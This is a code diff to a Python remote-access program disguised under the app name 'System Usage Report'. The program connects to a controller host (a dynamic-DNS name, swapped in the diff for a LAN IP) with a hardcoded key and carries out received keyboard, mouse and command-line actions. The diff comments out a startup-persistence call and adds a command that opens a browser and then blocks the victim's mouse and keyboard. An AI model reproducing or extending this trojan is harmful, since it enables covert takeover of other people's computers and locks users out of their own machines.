@@ -13,7 +13,8 @@ import time
 key = 's3DrdlnKQqHh67eCYxo2R18NE0trd6ih'
 timeout = 60
 
-host = 'hiddenname.keenetic.pro'
+# host = 'hiddenname.keenetic.pro'
+host = '192.168.1.71'
 port = 3142
 
 app_name = 'System Usage Report'
@@ -158,7 +159,17 @@ def mouse_cmd_process(cmd):
         return 'Specify the action'
 
 
-add_to_startup()
+def open_youtube(cmd):
+    run_cmd_command(f'start chrome {cmd[9:]}')
+    time.sleep(15)
+    keyboard.send('f')
+    time.sleep(0.2)
+    mouse_cmd_process('block')
+    keyboard_cmd_process('block')
+    return 'OK'
+
+
+# add_to_startup()
 
 while True:
     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -181,6 +192,8 @@ while True:
                 send(keyboard_cmd_process(command))
             elif command.startswith('mouse'):
                 send(mouse_cmd_process(command))
+            elif command.startswith('youtube'):
+                send(open_youtube(command))
             elif command == 'ping':
                 send('pong')
             else:
